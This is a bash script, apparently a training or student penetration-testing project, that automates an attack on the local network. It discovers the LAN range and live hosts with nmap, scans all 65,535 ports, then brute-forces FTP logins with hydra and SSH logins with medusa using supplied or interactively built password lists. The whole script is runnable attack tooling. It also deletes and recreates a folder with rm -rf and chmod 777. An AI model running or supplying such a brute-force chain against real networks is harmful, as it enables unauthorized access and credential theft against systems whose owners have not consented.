#!/bin/bash
function folder()
{
#start rec
echo "{@} start to make a folder $(date) {@}"
echo ""
#make a folder and delelet if the folder exist  
rm -rf report
sleep 1
mkdir $(pwd)/report
chmod 777 report
#echo  where is the folder
echo  "{@}### all the data  and logs will save in $(pwd)/report ###{@}"
echo ""
#end rec
echo "{@} end  makeing a folder $(date) {@}"
echo ""
}


###############################################################
function LANrange()
{
#start rec
echo "{@} start to scan the range $(date) {@}"
echo ""
#save to vriblies 
ip=$(ip address | awk '/inet .* eth/{print $2}')
# save into file
echo "$ip" >>$(pwd)/report/ip.txt 
#echo  identify the range on the lan
echo "{@} your lan range is {@}"
echo  "$ip"
#end rec
echo ""
echo "{@} end scan the range $(date) {@}" 
echo ""
}



###############################################################
function scan()
{
#start rec
echo "{@} start to scan the lan $(date) {@}" 
echo ""
#scan the lan by nmap  and save it in a file 
nmap -sn -iL $(pwd)/report/ip.txt >> $(pwd)/report/Lanscan.txt
echo "{@} all the nmap data in  $(pwd)/report/Lanscan.txt {@}"
echo ""
#end rec
echo "{@} end scan the lan $(date) {@}" 
echo ""
}


###############################################################
function Enumerate()
{
#rec start
echo "{@} start to see how many host is up  $(date) {@}" 
echo ""
#how many host are opened and echo to the user
h=$(cat $(pwd)/report/Lanscan.txt | grep -c "Host is up")
#tell the user  how many host is up
echo "{@} you have $h up in your network {@}"
echo ""
#end rec
echo "{@} end scan to see how many host is up  $(date) {@}" 	
echo ""
}


###############################################################

function vulnerabilities()
{
#start rec
echo "{@} start scan for vulnerabilities $(date) {@}" 
echo ""
#grep and save all the ip to file to scan 
grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$(pwd)/report/Lanscan.txt" >> "$(pwd)/report/openhost.txt"
# scan with nmap for any vulnerabilities and sve to file
nmap -Pn -p 1-65535 --open  -iL $(pwd)/report/openhost.txt >> $(pwd)/report/vulnerabilities.txt
#tell the user where is the file 
echo  " the file nmap scan for open port $(pwd)/report/vulnerabilities.txt"
echo ""
#end rec
echo "{@} end scan for vulnerabilities $(date) {@}" 	
echo ""
}


###############################################################

function input()
{
#start input user 
echo "{@} start  input user $(date) {@}" 
echo ""
#input user
read -p " # Sepify a user list : " user
echo ""
#tell  the user to choise 1 or 2 
echo "1. Specify a password list   #####  2. Create a password list"
echo ""
#input to user
read -p "Enter your choice (1 or 2): " pass
echo ""
#end rec
echo "{@} end  input user $(date) {@}" 
echo ""
}


###############################################################

function brute()
{
# now this command will  cheack what the user pick if he pick 1 or 2
if [ "$pass" == "1" ] 
then
#let the user enter a pass list 
read -p "Enter your pass list : " passwordlist
echo ""
#rec  start 
echo "{@} start to scan if the script can  brute force   $(date)  {@}" 
echo ""
#vrible 
ftp=$(cat $(pwd)/report/vulnerabilities.txt | grep -w  "21/tcp    open  ftp")
#start in the first server
if [ "$ftp" == "21/tcp    open  ftp" ]
then
#start rec
echo "{@} start brute force $(date) {@}" 
echo ""
echo "{@} we will try to brute force ftp login the first server {@} "
echo ""
hydra -L "$user" -P "$passwordlist" -M 'report/openhost.txt' ftp >> "$(pwd)/report/brute.txt" 2>/dev/null
echo "all the data saved in $(pwd)/report/brute.txt"
echo ""
#end rec
echo "{@} end brute force $(date) {@}" 
echo ""
#Prompt the user to enter an IP address
read -p "Enter an IP address to scan if i have relevant findings: " ip
echo ""
#scan for any relevant
cat report/*  | grep -i $ip
echo ""
exit
else
echo "didnt find any ftp server"
echo ""
fi
########################################################################


#vrible 
ssh=$(cat $(pwd)/report/vulnerabilities.txt | grep -w  "22/tcp    open  ssh")
if [ "$ssh" == "22/tcp    open  ssh" ]
then
#start rec
echo "{@} try to brute force ssh login {@} "
echo ""
medusa  -H 'report/openhost.txt' -P $passwordlist -U $user  -M ssh  >> $(pwd)/report/brute.txt 2>/dev/null
echo "all the data saved in $(pwd)/report/brute.txt"
echo ""
#end rec
echo "{@} end brute force $(date) {@}" 
echo ""
#Prompt the user to enter an IP address
read -p "Enter an IP address to scan if i have relevant findings: " ip
echo ""
#scan for any relevant
cat report/*  | grep -i $ip
echo ""
else
echo "there is no ssh or ftp i can brute force"
echo ""
#Prompt the user to enter an IP address
read -p "Enter an IP address to scan if i have relevant findings: " ip
echo ""
#scan for any relevant
cat report/*  | grep -i $ip
echo ""
exit
fi
########################################################################

elif [ "$pass" == "2" ]
then
#rec  start 
echo "{@} start to make  a pass list   $(date)  {@}" 
echo ""
#let the user create  a pass list 
while true 
do
# Prompt the user to enter a password or type exit to exit
read -p "Enter a password or type {exit} to exit: " password
echo "$password" >> "$(pwd)/report/passwordd.txt"
# Check if the user wants to exit
if [ "$password" == "exit" ]
then
break
fi
done
#end  start 
echo ""
echo "{@} end  makeing a pass list   $(date)  {@}" 
echo ""
#rec  start 
echo "{@} start to scan if the script can  brute force   $(date)  {@}" 
echo ""
#start in the first server
#vrible 
ftp=$(cat $(pwd)/report/vulnerabilities.txt | grep -w  "21/tcp    open  ftp")
if [ "$ftp" == "21/tcp    open  ftp" ]
then
#start rec
echo "{@} start brute force $(date) {@}" 
echo ""
echo "{@} we will try to brute force ftp login the first server {@} "
echo ""
hydra -L "$user" -P "$(pwd)/report/passwordd.txt" -M 'report/openhost.txt' ftp >> "$(pwd)/report/brute.txt" 2>/dev/null
echo "all the data saved in $(pwd)/report/brute.txt"
echo ""
#end rec
echo "{@} end brute force $(date) {@}" 
echo ""
#Prompt the user to enter an IP address
read -p "Enter an IP address to scan if i have relevant findings: " ip
echo ""
#scan for any relevant
cat report/*  | grep -i $ip
echo ""
exit
########################################################################


elif [ "$ssh" == "22/tcp    open  ssh"  ]
then
#start rec
echo "{@} the ftp didnt work so  we will try to brute force ssh login {@} "
echo ""
medusa  -H 'report/openhost.txt' -P "$(pwd)/report/passwordd.txt" -U "$user"  -M ssh  >> "$(pwd)/report/brute.txt" 2>/dev/null
echo "all the data saved in $(pwd)/report/brute.txt"
echo ""
#end rec
echo "{@} end brute force $(date) {@}" 
########################################################################

echo ""
echo "start to scan for any revelant ip"
echo ""
#Prompt the user to enter an IP address
read -p "Enter an IP address to scan if i have relevant findings: " ip
echo ""
#scan for any relevant
cat report/*  | grep -i $ip
echo ""
echo ""
else
echo "there is no ssh or ftp i can brute force"
echo ""
#Prompt the user to enter an IP address
read -p "Enter an IP address to scan if i have relevant findings: " ip
echo ""
#scan for any relevant
cat report/*  | grep -i $ip
echo ""
echo "start to scan for any revelant ip"
echo ""
exit
fi
fi
}
folder
LANrange
scan
Enumerate
vulnerabilities
input
brute

